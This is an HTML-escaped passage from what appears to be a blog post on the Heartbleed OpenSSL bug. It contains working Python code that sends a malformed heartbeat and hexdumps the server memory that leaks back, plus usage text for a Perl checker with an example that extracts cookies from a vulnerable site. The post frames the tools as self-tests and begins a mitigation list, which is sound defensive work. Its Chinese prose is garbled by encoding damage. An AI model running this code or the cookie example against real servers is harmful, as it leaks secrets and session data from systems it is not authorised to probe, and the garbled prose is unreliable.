&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;endtime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rtime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endtime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; 
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rtime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;# EOF?
&lt;/span&gt;            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;rdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdata&lt;/span&gt;
        

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;recvmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Unexpected EOF receiving record header - server closed connection&apos;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&amp;gt;BHH&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Unexpected EOF receiving record payload - server closed connection&apos;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos; ... received message: type = %d, ver = %04x, length = %d&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hit_hb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recvmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;No heartbeat response received, server likely not vulnerable&apos;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Received heartbeat response:&apos;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;hexdump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;WARNING: server returned more data than it should - server is vulnerable!&apos;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Server processed malformed heartbeat, but did not return any extra data.&apos;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Received alert:&apos;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;hexdump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Server returned error, likely not vulnerable&apos;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;opts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse_args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;print_help&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Connecting...&apos;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;opts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Sending Client Hello...&apos;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Waiting for Server Hello...&apos;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recvmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Server closed connection without sending Server Hello.&apos;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# Look for server hello done message.
&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Sending heartbeat request...&apos;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;hit_hb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;__main__&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ul&gt;
  &lt;li&gt;Ëá™ÊàëÊ∏¨Ë©¶Â∑•ÂÖ∑ &lt;a href=&quot;https://github.com/noxxi/p5-scripts/blob/master/check-ssl-heartbleed.pl&quot;&gt;https://github.com/noxxi/p5-scripts/blob/master/check-ssl-heartbleed.pl&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;‰ΩøÁî®ÊñπÊ≥ïÁõ¥Êé•Âü∑Ë°å„Äåperl check-ssl-heartbleed.pl mail.XXXXXX.gov.tw:443„ÄçÔºåÂèØÂú®Á∂≤ÂüüÂêçÁ®±ÂæåÊåáÂÆöÁâπÂÆö SSL ÈÄ£Êé•Âü†„ÄÇ&lt;/p&gt;

&lt;p&gt;‰ΩøÁî®Ë™™ÊòéÔºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-console&quot; data-lang=&quot;console&quot;&gt;&lt;span class=&quot;go&quot;&gt;Check if server is vulnerable against heartbleet SSL attack (CVE-2014-0160)
Usage: check-ssl-heartbleed.pl [ --starttls proto[:arg] ] [ --timeout T ] host:port
  --starttls proto[:arg] - start plain and upgrade to SSL with
			   starttls protocol (imap,smtp,http,pop)
  -T|--timeout T         - use timeout (default 5)
  -H|--heartbeats N      - number of heartbeats (default 1)
  -s|--show-data [L]     - show heartbeat response if vulnerable, optional
                           parameter L specifies number of bytes per line (16)
  -R|--show-regex-data R - show data matching perl regex R. Option can be
                           used multiple times
  -q|--quiet             - don&apos;t show anything, exit 1 if vulnerable
  -h|--help              - this screen

Examples:
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;check direct www, imaps .. server
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl www.google.com:443
  check-ssl-heartbleed.pl www.google.com:https
  check-ssl-heartbleed.pl mail.google.com:imaps

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;try to get Cookies
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl -R &apos;Cookie:.*&apos; www.broken-site.com:443

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;check webserver via proxy
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl --starttls http:www.google.com:443 proxy:8000

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;check imap server, start with plain and upgrade
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl --starttls imap imap.gmx.net:143

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;check pop server, start with plain and upgrade
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl --starttls pop pop.gmx.net:110

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;check smtp server, start with plain and upgrade
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl --starttls smtp smtp.gmail.com:587
  &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;ÊáâÂ∞çÊé™ÊñΩ&quot;&gt;ÊáâÂ∞çÊé™ÊñΩ&lt;/h3&gt;

&lt;p&gt;Â¶ÇÊûúÁôºÁèæËá™Â∑±ÁöÑ‰º∫ÊúçÂô®ÊúâÈÄôÊ®£ÁöÑÊºèÊ¥ûÔºåË©≤ÊÄéÈ∫ºËæ¶Âë¢Ôºü&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Á¢∫Ë™çËá™Â∑±ÁöÑ OpenSSL ÁâàÊú¨ÊòØÂê¶Âú®ÂèóÂÆ≥ÁØÑÂúç&lt;/li&gt;
  &lt;li&gt;‰ΩøÁî® ssltest.py Ê™¢Ê∏¨Â∑•ÂÖ∑Ê™¢Ê∏¨ÊòØÂê¶Âê´ÊúâÊºèÊ¥û&lt;/li&gt;
